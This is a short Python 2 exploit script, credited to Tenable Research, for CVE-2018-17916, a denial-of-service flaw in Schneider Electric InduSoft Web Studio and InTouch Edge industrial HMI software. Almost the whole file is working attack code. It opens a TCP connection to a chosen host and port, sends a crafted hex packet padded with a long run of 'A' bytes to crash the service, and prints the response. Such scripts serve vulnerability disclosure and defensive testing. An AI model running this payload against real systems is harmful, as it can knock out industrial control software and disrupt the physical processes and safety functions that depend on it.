##
# Exploit Title: Schneider Electric InduSoft/InTouch Denial of Service
# Date: 06/11/2019
# Exploit Author: Tenable Research
# CVE : CVE-2018-17916
# Advisory: https://www.tenable.com/security/research/tra-2018-34
# Affected Vendors/Device/Firmware:
#  - InduSoft Web Studio v8.1 SP2 or prior
#  - InTouch Edge 2017 v8.1 SP2 or prior
##

import socket, argparse, binascii
from struct import *

parser = argparse.ArgumentParser()
parser.add_argument("target_host", help="InduSoft host") 
parser.add_argument("target_port", help="InduSoft port (ie. 1234)", type=int) 
args = parser.parse_args()
  
host = args.target_host
port = args.target_port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

data =  '02311031103810321032030245000000'
data += '000000000000000000fffeff08520065'
data += '00730065007200760065006400fffeff'
data += '08520065007300650072007600650064'
data += '00fffeff00fffeff3144006900730074'
data += '00720069006200750074006500640054'
data += '006f006b0065006e007c003200330039'
data += '00330062006600380035003500370061'
data += '00330062006400610038006600330031'
data += '00390037003800370037006100370064'
data += '0031006600350062006500fffeff2048'
data += '00480048004800480048004800480048'
data += '00480048004800480048004800480048'
data += '00480048004800480048004800480048'
data += '00480048004800480048004800480000'
data += '000000030243313509'
data += 'A' * 0x500
data += '09736f6d655f737472093130300a03'

s.send(data)
res = s.recv(1024)
print binascii.hexlify(res)